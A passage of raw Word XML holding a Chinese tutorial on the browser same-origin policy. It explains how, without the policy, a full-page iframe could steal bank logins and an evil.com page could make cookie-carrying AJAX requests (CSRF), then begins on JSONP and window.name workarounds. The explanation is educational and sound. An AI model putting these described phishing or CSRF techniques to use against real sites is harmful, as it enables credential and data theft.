          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB88D2A" w14:textId="661D8185"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hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2</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把</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> iframe </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360C37BC" w14:textId="0D3FE596"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3</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这时如果用户输入账号密码，我们的主网站可以跨域访问到</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://mybank.com </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> dom </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>节点，就可以拿到用户的账户密码了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC2F8F9"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如果</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> XMLHttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>同源策略，那么黑客可以进行</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>（跨站请求伪造）</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>攻击：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD61B7D" w14:textId="209222DC"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hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1</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用户登录了自己的银行页面</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://mybank.com</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">http://mybank.com </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>向用户的</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中添加用户标识。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE93246" w14:textId="17BAB6E8"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2</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用户浏览了恶意页面</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://evil.com</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，执行了页面中的恶意</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> AJAX </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203A732F" w14:textId="120ED03F"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3</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 xml:space="preserve">http://evil.com </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>向</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://mybank.com </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>发起</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> AJAX HTTP </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求，请求会默认把</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://mybank.com </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对应</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>也同时发送过去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D619E0C" w14:textId="08532999"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4</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银行页面从发送的</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中提取用户标识，验证用户无误，</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">response </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中返回请求数据。此时数据就泄露了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F9399B" w14:textId="48E962EE"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5</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而且由于</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ajax </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>在后台执行，用户无法感知这一过程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0823C3E8"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因此，有了浏览器同源策略，我们才能更安全的上网。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1F5187" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B" w:rsidRDefault="008B2E56" w:rsidP="0095285B">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4"/>
          <w:szCs w:val="34"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>跨域的解决方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F87955D" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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lastRenderedPageBreak/>
        <w:t>从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F79EB27" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B" w:rsidRDefault="008B2E56" w:rsidP="0095285B">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4"/>
          <w:szCs w:val="34"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>前端跨域问题产生原因和解决方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233EECE5"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一、产生原因</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4012C9BC" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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跨域是</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>页面想要获取</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>页面资源，如果</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>a,b</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>页面的协议、域名、端口号、子域名不同，所进行的访问都是跨域的，而浏览器一般为了安全都限制了跨域访问，也就是不允许跨域访问资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD20225" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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2"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>二、解决办法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A91EE8"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1.JSONP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D137F7A" w14:textId="75B88FE8"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1</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JSONP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是一个非官方协议，它允许在服务器端集成</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>script tags</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回至客户端，通过</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>javascript callback</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的形式实现跨域访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100E32F4" w14:textId="72CDA4A3"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hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2</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基本思想：网页通过添加一个</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>元素，向服务器请求</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据，这种做法不受同源策略限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC586F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&lt;script type="text/javascript"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D89BA3"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function jsonpCallback(result){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D77C22"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//alert(result);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C1D58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for(var i in result){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672895B2"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alert(i + ":" + result[i]);     //</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>循环输出</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B03B3B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78125C7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7371BA5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var JSONP = document.createElement("script");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D065A2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JSONP.type = "text/javascript";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE173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JSONP.src = "http://crossdomain.com/services.php?callback=jsonpCallback";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428E3D2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document.getElementsByTagName("head")[0].appendChild(JSONP);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CBD6C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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FB8E8C"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2.window.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68986D2B" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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window.name+iframe</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>需要目标服务器响应</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window.name</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象有一个</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>属性，该属性有个特征：即在一个窗口（</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）的生命周期内，窗口载入的所有的页面都是共享一个</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window.name</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的，每个页面对</w:t>
      </w:r>
